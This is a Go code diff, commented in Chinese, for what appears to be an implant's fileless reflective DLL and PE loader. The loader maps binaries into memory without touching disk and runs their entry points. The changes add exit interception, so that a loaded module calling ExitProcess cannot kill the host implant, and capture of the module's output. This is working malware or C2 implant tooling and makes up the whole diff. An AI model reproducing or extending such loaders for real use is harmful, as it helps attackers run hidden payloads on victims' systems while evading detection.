@@ -52,6 +52,10 @@ type memPE struct {
 }
 
 // loadDLLMem 反射加载 DLL：映射到内存、修复重定位与导入表后调用入口点，全程不落盘。
+//
+// v1.4.0 S6 P0-2：与 runMappedImage 一样接入退出拦截与 stdout/stderr 捕获 ——
+// DLL 里的代码若调 ExitProcess，同样会把宿主带走（而且这条路径是在**宿主线程**上
+// 同步执行被映射代码，判定走"栈上有没有镜像帧"这一支，见 mexecguard_windows.go）。
 func loadDLLMem(dataB64, entryName string) (string, int32, string) {
 	raw, err := base64.StdEncoding.DecodeString(dataB64)
 	if err != nil {
@@ -61,6 +65,11 @@ func loadDLLMem(dataB64, entryName string) (string, int32, string) {
 	if err != nil {
 		return "", -1, fmt.Sprintf("reflective load failed: %v", err)
 	}
+
+	// 退出拦截：必须在调用入口点之前武装。
+	exitCountBefore, _ := guardExitStats()
+	imageHits, moduleHits := guardArmImage(base, info, "dll")
+	capture := guardBeginStdioCapture()
 
 	// 调用 DLL 入口点（即 DllMain）：DllMain(hinstDLL, DLL_PROCESS_ATTACH, 0)
 	if info.entryRVA != 0 {
@@ -74,7 +83,15 @@ func loadDLLMem(dataB64, entryName string) (string, int32, string) {
 		}
 	}
 
-	return fmt.Sprintf("DLL reflectively loaded at 0x%x (%d bytes)", base, len(raw)), 0, ""
+	stdoutText, stderrText, capNote := capture.End(true)
+	exitCountAfter, lastExit := guardExitStats()
+
+	out := fmt.Sprintf("DLL reflectively loaded at 0x%x (%d bytes)\n%s", base, len(raw), guardPatchSummary(imageHits, moduleHits))
+	if exitCountAfter > exitCountBefore {
+		out += fmt.Sprintf("\n[退出拦截] 模块调用 %s(%d) 已被改写为 ExitThread：宿主植入端未退出。", lastExit.via, lastExit.code)
+	}
+	out += guardFormatCaptured(stdoutText, stderrText, capNote)
+	return out, 0, ""
 }
 
 // mapImagePE 反射式映射 PE 镜像：先以 RW（可写不可执行）申请整块镜像内存，
@@ -117,6 +134,12 @@ func mapImagePE(raw []byte) (uintptr, *memPE, error) {
 
 	// 刷新指令缓存（x86/x64 上通常为空操作，ARM 上必需）
 	resolveAPI("kernel32.dll", "FlushInstructionCache").Call(^uintptr(0), base, uintptr(info.sizeOfImage))
+
+	// 登记镜像区间（v1.4.0 S6 P0-2）：退出拦截的判定要用它来回答
+	// "当前线程是不是正在跑这个被映射进来的镜像"。统一在这里登记，
+	// exe_mem / dll / exec_module 三条路径都自动生效；exec_module 释放镜像时
+	// 由 freeMem 注销，避免"区间还留着但内存已还"的误判。
+	guardRegisterImage(base, uintptr(info.sizeOfImage), "reflect")
 
 	return base, info, nil
 }
